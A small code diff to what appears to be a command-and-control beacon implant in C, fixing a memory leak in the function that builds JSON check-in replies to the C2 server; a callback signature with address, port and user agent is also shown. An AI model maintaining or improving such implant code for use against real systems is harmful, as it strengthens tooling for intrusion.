@@ -313,7 +313,7 @@ LPCSTR* BuildCheckinData(DWORD OpCode, LPCSTR Data, DWORD Mode)
     /*
     Build the reply to the C2 containing any data we need to send back
     */
-
+    LPCSTR *beaconCheckinData;
     struct json_object *jobj;
 
     // init the json object
@@ -343,7 +343,9 @@ LPCSTR* BuildCheckinData(DWORD OpCode, LPCSTR Data, DWORD Mode)
     }
 
     // return the formated data
-    return (LPCSTR*)json_object_to_json_string_ext(jobj, JSON_C_TO_STRING_PLAIN);
+    beaconCheckinData = (LPCSTR *) _strdup(json_object_to_json_string_ext(jobj, JSON_C_TO_STRING_PLAIN));
+    json_object_put(jobj);
+    return beaconCheckinData;
 }
 
 LPCWSTR* BeaconCallbackC2(LPCSTR CallbackAddress, INT CallbackPort, LPCSTR UserAgent, DWORD *OpCode, LPCSTR SendBuffer, DWORD SendOpCode, DWORD SendBufferSize)
